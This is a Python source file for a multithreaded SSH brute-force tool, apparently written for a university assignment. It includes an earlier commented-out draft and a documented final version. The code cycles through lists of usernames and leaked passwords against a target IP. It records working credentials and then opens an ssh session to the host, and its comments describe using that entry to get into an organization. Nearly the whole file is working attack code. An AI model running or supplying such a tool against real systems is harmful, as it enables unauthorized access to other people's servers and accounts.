# #!/usr/bin/evn python
#
# import time
# from colors import *
# import argparse
# from threading import Thread
# import queue
# import paramiko
# import socket
# import sys
# import logging
#
#
# class brute_force_ssh():
# 	def __init__(self):
# 		self.ip = ""
# 		self.port = 22
# 		self.password_list = []
# 		self.threads = 0
# 		self.timeout = 0
# 		self.usernames = queue.LifoQueue()
# 		self.passwords = queue.LifoQueue()
# 		self.format = "{} : {:_<40} {}"
#
# # running the brute force attack
# 	def attack(self):
# 		print(fcb + """
# 			 _____    _____    _   _
# 			/   __|  /   __|  | | | |
# 		   	|  (___  |  (___  | |_| |
# 			\___   \*\___   \*|  _  |
# 			 ___)  |  ___)  | | | | |
# 			|_____/  |_____/  |_| |_|	 %s
# 					""" % sf)
#
# 		use = "\r" + info_out + fmb + "python " + fgb + "brute_force_ssh.py " + ffb + "-i Host [OPTION]" + sf
# 		parser = argparse.ArgumentParser(description='', usage=use)
# 		# created a positional arguments
# 		parser._optionals.title = fmb + "Main Menu" + sf
# 		parser.add_argument('-p', '--port', action="store", default=22, type=int, dest='host_port',
# 							help='Target Port Number (Default 22)')
# 		parser.add_argument('-T', '--timeout', action="store", default=5, type=int, dest='timeout',
# 							help='Request timeout (Default 5)')
# 		parser.add_argument('-t', '--threads', action="store", default=4, type=int, dest='threads',
# 							help='No of threads (Default 4)')
# 		# parser.add_argument('-u', '--user', action="store", dest='user', help='SSH User name (Default root)')
# 		parser.add_argument('-u', '--user', action="store", dest='user')
# 		parser.add_argument('-U', '--usersfile', action="store", dest='usersfile', help='Usernames File Path')
# 		parser.add_argument('-i', '--ip', action="store", dest='host_ip', help='Target IP Address', required=True)
# 		parser.add_argument('-P', '--passowrdsfile', action="store", default="leaked_list/passwords.txt",
# 							dest='passwordsfile', help='Passwords File Path')
# 		args = parser.parse_args()
# 		self.ip = args.host_ip
# 		self.port = args.host_port
# 		self.threads = args.threads
# 		self.threads = args.threads
# 		self.timeout = args.timeout
# 		if args.user:
# 			self.usernames.put(args.user)
# 		elif args.usersfile:			#function fill the queue in usernames from the usernames file
# 			self.queue_fill(args.usersfile, True)
# 		if args.passwordsfile:
# 			self.queue_fill(args.passwordsfile, False)
# 		self.multiple_brute_attack()
#
#
# #function iterate on the usernames file
# 	def read_file(self, f_names):
# 		with open(f_names) as file:
# 			file_list = file.readlines()
# 			file_list = [line.strip() for line in file_list]
# 			final_list = list(set(file_list))
# 			return final_list
#
# #function fill the queue in usernames from the usernames file
# 	def queue_fill(self, f_names, flag=False):
# 		if flag:
# 			for username in self.read_file(f_names):
# 				self.usernames.put(username)
# 		else:
# 			self.password_list = self.read_file(f_names)
#
# # function fill the queue in passwords from the passwords file
# 	def password_queue_fill(self):
# 		for password in self.password_list:
# 			self.passwords.put(password)
#
# #try to connect to ssh according to the passwords and usernames in the text files
# 	def connect_ssh(self, username):
# 		while not self.passwords.empty():
# 			time.sleep(0.1)
# 			password = self.passwords.get()
# 			ssh = paramiko.SSHClient()
# 			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# 			try:
# 				#if there is connection the username and password append in the list of available usernames and password
# 				# flag = False
# 				ssh.connect(self.ip, port=self.port, username=username, password=password,
# 							allow_agent=False, look_for_keys=False, timeout=self.timeout)
# 				print(info_out + ffb + self.format.format(username, password, fgb + "Connected" + sf))
# 				# ssh.close()
# 				list1 = [username, password]
# 				good_uNp.append(list1)
# 				list1 = []
# 				sys.exit()
# 			except paramiko.AuthenticationException:
# 				print(ver_out + ffb + self.format.format(username, password, frb + "Rejected" + sf))
# 			except socket.error as e:
# 				print(err_out + ffb + self.format.format(username, password, fcb + "Connection Error" + sf))
# 			except paramiko.SSHException:
# 				self.passwords.put(password)
# 				list1 = [username, password]
# 				error_uNp.append(list1)
# 				list1 = []
#
# #function manage single server brute force attack
# 	def user_attack(self, username):
# 		list = []
# 		self.password_queue_fill()
# 		for i in range(1, (self.threads + 1)):
# 			time.sleep(4)
# 			thread = Thread(target=self.connect_ssh, args=(username,))
# 			thread.start()
# 			list.append(thread)
# 		for thread in list:
# 			thread.join()
#
# # function manage multiple server brute force attack
# 	def multiple_brute_attack(self):
# 		logging.basicConfig()
# 		logging.getLogger("paramiko.transport").disabled = True
# 		while not self.usernames.empty():
# 			self.user_attack(self.usernames.get())
#
#
#
#
# if __name__ == '__main__':
# 	global flag
# 	good_uNp = []
# 	error_uNp = [] 			#list of user and password that return errors
# 	brute_shh = brute_force_ssh()
# 	brute_shh.attack()
# 	# print(f'Error in the following data: {error_uNp}')
# 	if len(good_uNp) == 1:
# 		good_uNp = good_uNp[0]
# 		print(f'Acceptable usernames and passwords: {good_uNp}')
# 		os.system(f'ssh {good_uNp[0]}@{brute_shh.ip}')
# 	elif len(good_uNp) == 0:
# 		print("You failed the attack!!!!!!")
# 	else:
# 		print(f'Acceptable usernames and passwords: {good_uNp}')
# 		os.system(f'ssh {good_uNp[0][0]}@{brute_shh.ip}')
# # os.system(good_uNp[0][1])
# 	print("\n")
#!/usr/bin/evn python
import time
from colors import *
import argparse
from threading import Thread
import queue
import paramiko
import socket
import sys
import logging
global flag


#################################################################################################################################################
### Run (in Linux): ###
# 1) Install the required modules in the assignment
# 2) Brute force of a single user:
# python3 brute_force_ssh.py -i IP -u USERNAME -P leaked_lists/passwords.txt
# 3) Brute force of all users:
# python3 brute_force_ssh.py -i IP -U leaked_lists/usernames.txt -P leaked_lists/passwords.txt
#################################################################################################################################################
# In this assignment we were asked to implement an SSH attack, the attack we chose is Brute Force Attack.
# Our program will run through a list of usernames and a list of leaked passwords, trying every possible combination until it finds a match.
# After you manage to make a match, the "attacker" will take advantage of the entrance to the organization and will be able to achieve his goals.
#################################################################################################################################################

def read_file(f_names) -> list:
    with open(f_names) as file:
        file_list = file.readlines()
        # .strip(); called without parameters removes all whitespace from the start and end of some_string
        file_list = [line.strip() for line in file_list]
        # Build an unordered collection of unique elements.
        final_list = list(set(file_list))
        return final_list


def time_to_sleep():
    time.sleep(0.2)


class brute_force_ssh:
    def __init__(self):
        self.ip = None
        self.port = 22
        self.threads = 0
        self.timeout = 0
        self.password_list = []
        self.usernames = queue.LifoQueue()
        self.passwords = queue.LifoQueue()
        self.format = "{} : {:_<40} {}"

    # running the brute force attack
    # https://docs.python.org/3/library/argparse.html
    def attack(self) -> None:
        print(fcb + """ 
             _____    _____    _   _ 
            /   __|  /   __|  | | | |
            |  (___  |  (___  | |_| |
            \___   \*\___   \*|  _  |
             ___)  |  ___)  | | | | |
            |_____/  |_____/  |_| |_|	 %s
                    """ % sf)
        print(fcb + """ Brute force attack	 %s by Raz Elbaz and Yuval bar maoz
                    """ % sf)

        str = "\r" + info_out + fmb + "python " + fgb + "brute_force_ssh.py " + ffb + "-i Host [OPTION]" + sf
        parser = argparse.ArgumentParser(description='', usage=str)
        # created a positional arguments
        parser._optionals.title = fmb + "Main Menu" + sf
        # parser.add_argument; these calls tell the ArgumentParser how to take the strings on the command line and turn them into objects
        parser.add_argument('-p', '--port', action="store", default=22, type=int, dest='host_port',
                            help='Target Port Number (Default 22)')
        parser.add_argument('-T', '--timeout', action="store", default=5, type=int, dest='timeout',
                            help='Request timeout (Default 5)')
        parser.add_argument('-t', '--threads', action="store", default=5, type=int, dest='threads',
                            help='No of threads (Default 4)')
        parser.add_argument('-u', '--user', action="store", dest='user')
        parser.add_argument('-U', '--usersfile', action="store", dest='usersfile', help='Usernames File Path')
        parser.add_argument('-i', '--ip', action="store", dest='host_ip', help='Target IP Address', required=True)
        parser.add_argument('-P', '--passowrdsfile', action="store", default="leaked_list/passwords.txt",
                            dest='passwordsfile', help='Passwords File Path')

        # ArgumentParser objects associate command-line arguments with actions.
        # These actions can do just about anything with the command-line arguments associated with them,
        # though most actions simply add an attribute to the object returned by parse_args().
        # The action keyword argument specifies how the command-line arguments should be handled.
        args = parser.parse_args()
        self.ip = args.host_ip
        self.port = args.host_port
        self.threads = args.threads
        self.timeout = args.timeout
        if args.user:
            self.usernames.put(args.user)
        # function fill the queue in usernames from the usernames file
        elif args.usersfile:
            self.queue_fill(args.usersfile, True)
        # if there is no list
        else:
            exit()

        if args.passwordsfile:
            self.queue_fill(args.passwordsfile, False)

        self.multiple_brute_attack()

    # function fill the queue in usernames from the usernames file
    def queue_fill(self, f_names, flag=False):
        if flag:
            # function iterate on the usernames file
            for username in read_file(f_names):
                self.usernames.put(username)
        else:
            self.password_list = read_file(f_names)

    # function fill the queue in passwords from the passwords file
    def queue_fill_password(self):
        for password in self.password_list:
            self.passwords.put(password)

    # try to connect to ssh according to the passwords and usernames in the text files
    def connecting(self, username):
        while not self.passwords.empty():
            time_to_sleep()
            password = self.passwords.get()
            #paramiko.SSHClient(); A high-level representation of a session with an SSH server
            ssh = paramiko.SSHClient()
            #ssh.set_missing_host_key_policy; Set policy to use when connecting to servers without a known host key.
            #paramiko.AutoAddPolicy(); Policy for automatically adding the hostname and new host key to the local .HostKeys object, and saving it. This is used by .SSHClient.
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                # if there is connection the username and password append in the list of available usernames and password
                #ssh.connect; Connect to an SSH server and authenticate to it. The server's host key is checked against the system host keys
                ssh.connect(self.ip, port=self.port, username=username, password=password,
                            allow_agent=False, look_for_keys=False, timeout=self.timeout)
                print(info_out + ffb + self.format.format(username, password, fgb + "Connected" + sf))
                #Close this SSHClient and its underlying
                ssh.close()
                #enter the match username and password to list
                list1 = [username, password]
                #enter the match username and password to list of all the match
                good_uNp.append(list1)
                list1 = []
                sys.exit()

            #Exception raised when authentication failed for some reason.
            except paramiko.AuthenticationException:
                print(ver_out + ffb + self.format.format(username, password, frb + "Rejected" + sf))
            #This module provides socket operations and some related functions.
            except socket.error as e:
                print(err_out + ffb + self.format.format(username, password, fcb + "Connection Error" + sf))
            #Exception raised by failures in SSH2 protocol negotiation or logic errors
            except paramiko.SSHException:
                # if there is a logic or ssh problem we return this password for trying again
                self.passwords.put(password)

    # function manage single server brute force attack
    def user_attack(self, username):
        list = []
        self.queue_fill_password()
        for i in range(1, (self.threads + 1)):
            time_to_sleep()
            thread = Thread(target=self.connecting, args=(username,))
            thread.start()
            list.append(thread)
        for thread in list:
            # Wait until the thread terminates.
            thread.join()

    # function manage multiple server brute force attack
    def multiple_brute_attack(self):
        # The basicConfig configures the root logger
        logging.basicConfig()
        # This is to work around the paramiko logging issue when SSH failed
        logging.getLogger("paramiko.transport").disabled = True
        while not self.usernames.empty():
            self.user_attack(self.usernames.get())


if __name__ == '__main__':
    # list of user and password that return success
    good_uNp = []
    brute_shh = brute_force_ssh()
    brute_shh.attack()
    if len(good_uNp) == 1:
        good_uNp = good_uNp[0]
        print("\n")
        print(fgb + "You successfully performed a brute force attack %s""" % sf)
        print(f'Acceptable usernames and passwords: {good_uNp}')
        os.system(f'ssh {good_uNp[0]}@{brute_shh.ip}')
    elif len(good_uNp) == 0:
        print("\n")
        print(frb + "You failed the attack!!!!!! %s""" % sf)
    else:
        print(f'Acceptable usernames and passwords: {good_uNp}')
        os.system(f'ssh {good_uNp[0][0]}@{brute_shh.ip}')
